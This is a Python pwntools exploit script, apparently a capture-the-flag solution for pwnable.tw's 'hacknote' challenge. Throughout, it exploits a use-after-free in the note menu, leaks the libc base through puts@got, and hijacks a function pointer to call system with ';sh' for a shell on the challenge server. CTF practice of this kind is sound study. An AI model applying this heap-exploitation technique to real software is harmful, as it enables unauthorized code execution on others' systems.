#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('hacknote', checksec=0)
libc = ELF('libc_32.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10102)
else:
  p = binary.process(env={'LD_PRELOAD': 'libc_32.so.6'})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

def add_note(size : int, content):
  log.info('add_note(%d, %s)' % (size, content))
  s(b'1', b'choice :')
  s(str(size).encode(), b'size :')
  s(content, b'Content :')

def delete_note(idx : int):
  log.info('delete(%d)' % idx)
  s(b'2', b'choice :')
  s(str(idx).encode(), b'Index :')

def print_note(idx : int):
  log.info('print(%d)' % idx)
  s(b'3', b'choice :')
  s(str(idx).encode(), b'Index :')

# leak libc by reading puts@got
add_note(16, b'A')
add_note(16, b'B')
delete_note(0)
delete_note(1)
add_note(8, p32(0x804862b)+p32(binary.got['puts']))
print_note(0)

# call libc@system with ";sh\x00" as parameter
leak = u32(p.recv(4)) - libc.sym['puts']
log.info("Leaked libc base address: %#lx" % leak)
delete_note(2)
add_note(8, p32(libc.sym['system']+leak) + b";sh\x00")
print_note(0)

p.interactive()

